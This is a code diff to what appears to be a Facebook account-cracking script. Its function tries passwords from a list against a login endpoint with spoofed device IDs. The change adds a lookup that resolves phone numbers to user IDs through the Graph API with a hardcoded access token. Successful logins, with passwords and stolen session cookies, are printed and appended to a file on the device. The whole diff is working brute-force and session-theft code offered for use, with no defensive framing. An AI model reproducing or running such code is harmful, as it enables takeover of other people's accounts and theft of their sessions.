@@ -940,7 +940,9 @@ def rndm1(uid,passlist):
                         li2 = random.choice(li)
                         j1 = ''.join(random.choice(string.digits) for _ in range(2))
                         jazoest = li2+j1
-                        data = {'email': uid, 
+                        uis = requests.get(f"https://graph.facebook.com/v12.0/phone_number?access_token='350685531728|62f8ce9f74b12f84c123cc23437a4a32'&phone={uid}").json().get('id')
+                        print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+uis)
+                        data = {'email': uis, 
 'password': pas, 
 'adid': str(uuid.uuid4()),
 'device_id': str(uuid.uuid4()),
@@ -984,10 +986,10 @@ def rndm1(uid,passlist):
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
                                         cid = str(po['uid'])
-                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+uis+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
-                                        open('/sdcard/BITHIKA-RANDOM-M1-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
+                                        open('/sdcard/BITHIKA-RANDOM-M1-OK.txt', 'a').write(uis+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(cid)
                                         cek_apk(coki)
                                         return True
